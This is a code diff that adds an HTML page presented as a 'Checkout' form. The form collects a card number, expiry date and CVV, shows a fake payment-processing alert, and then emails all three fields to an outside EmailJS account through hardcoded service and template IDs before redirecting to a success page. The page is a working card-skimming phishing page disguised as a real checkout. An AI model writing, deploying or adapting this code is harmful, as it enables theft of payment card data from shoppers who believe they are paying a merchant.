@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            width: 300px;
+            margin: 50px auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 10px #ccc;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            display: block;
+        }
+        button {
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+    <!-- Include EmailJS library -->
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init('velYRZvCuQ7F7jAc6'); // Replace 'your_user_id' with your actual EmailJS user ID
+        })();
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h2>Checkout</h2>
+        <form id="payment-form">
+            <input type="text" id="card-number" placeholder="Card Number" required>
+            <input type="text" id="card-expiration" placeholder="MM/YY" required>
+            <input type="text" id="card-cvv" placeholder="CVV" required>
+            <button type="submit">Pay Now</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('payment-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            // Simulate payment processing
+            alert('Processing your payment...');
+
+            // Prepare the data to be sent via EmailJS
+            var formData = {
+                card_number: document.getElementById('card-number').value,
+                card_expiration: document.getElementById('card-expiration').value,
+                card_cvv: document.getElementById('card-cvv').value,
+            };
+
+            // Send the email
+            emailjs.send('service_8or8nld', 'template_9jzckck', formData)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    // After processing (simulated here), redirect to success page
+                    window.location.href = 'success.html'; // Redirect to the success page
+                }, function(error) {
+                    console.log('FAILED...', error);
+                });
+        });
+    </script>
+</body>
+</html>
+
